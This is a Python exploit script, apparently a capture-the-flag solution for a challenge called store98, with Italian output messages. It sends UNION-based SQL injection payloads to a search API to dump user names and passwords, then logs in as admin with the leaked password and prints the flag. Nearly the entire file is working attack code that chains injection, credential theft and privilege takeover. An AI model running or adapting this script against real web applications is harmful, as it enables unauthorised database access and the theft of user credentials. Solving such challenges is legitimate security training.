#!/usr/bin/env python3
import argparse
from typing import Optional

import requests


PAYLOADS = [
    r"\' UNION SELECT 1,0,username,password,username,password FROM users #",
    r"\' UNION ALL SELECT 1,0,username,password,username,password FROM users #",
]


def get_csrf(session: requests.Session, base_url: str) -> None:
    print("[*] GET /api/v1/csrf")
    r = session.get(f"{base_url}/api/v1/csrf", timeout=10)
    print(f"    status={r.status_code}")
    r.raise_for_status()
    token = session.cookies.get("csrf-token")
    if not token:
        raise RuntimeError("csrf-token cookie non trovato")
    print(f"    csrf-token={token}")


def dump_users(session: requests.Session, base_url: str) -> list[tuple[str, str]]:
    last_error = "nessun payload riuscito"
    for idx, payload in enumerate(PAYLOADS, start=1):
        print(f"\n[*] Tentativo payload {idx}/{len(PAYLOADS)}")
        print(f"    payload={payload}")
        get_csrf(session, base_url)
        r = session.get(f"{base_url}/api/v1/search", params={"name": payload}, timeout=10)
        print(f"    GET /api/v1/search status={r.status_code}")
        data = r.json()
        print(f"    tipo risposta={type(data).__name__}")

        if isinstance(data, dict) and data.get("error"):
            last_error = data["error"]
            print(f"    errore API={last_error}")
            continue
        if not isinstance(data, list):
            last_error = f"risposta inattesa: {data!r}"
            print(f"    {last_error}")
            continue

        out = []
        for row in data:
            user = row.get("name")
            pwd = row.get("description")
            if isinstance(user, str) and isinstance(pwd, str):
                out.append((user, pwd))

        if out:
            print(f"    righe utili estratte={len(out)}")
            print("    anteprima:")
            for user, pwd in out[:5]:
                print(f"      - {user}:{pwd}")
            return out

        print("    nessuna riga utile")

    raise RuntimeError(f"SQLi fallita: {last_error}")


def pick_admin(creds: list[tuple[str, str]]) -> Optional[str]:
    for user, pwd in creds:
        if user == "admin":
            return pwd
    return None


def login_admin(session: requests.Session, base_url: str, password: str) -> dict:
    print("\n[*] POST /api/v1/session (login admin)")
    r = session.post(
        f"{base_url}/api/v1/session",
        json={"username": "admin", "password": password},
        timeout=10,
    )
    print(f"    status={r.status_code}")

    if r.status_code == 401:
        raise RuntimeError("login admin fallito (401)")

    r.raise_for_status()
    data = r.json()
    if not isinstance(data, dict):
        raise RuntimeError(f"risposta login inattesa: {data!r}")
    return data


def main() -> None:
    parser = argparse.ArgumentParser(description="Exploit store98 (SQLi -> admin login -> flag)")
    parser.add_argument(
        "--url",
        default="http://store98.challs.cyberchallenge.it",
        help="URL base target (default: %(default)s)",
    )
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    print(f"[*] Target: {base_url}")

    with requests.Session() as session:
        creds = dump_users(session, base_url)
        print(f"[+] Credenziali trovate: {len(creds)}")

        admin_pwd = pick_admin(creds)
        if not admin_pwd:
            raise RuntimeError("utente admin non trovato nei leak")

        print(f"[+] Password admin: {admin_pwd}")
        result = login_admin(session, base_url, admin_pwd)
        print(f"[+] Risposta login: {result}")

        flag = result.get("flag")
        if flag:
            print(f"[FLAG] {flag}")
        else:
            print("[!] Login riuscito ma campo flag assente")


if __name__ == "__main__":
    main()
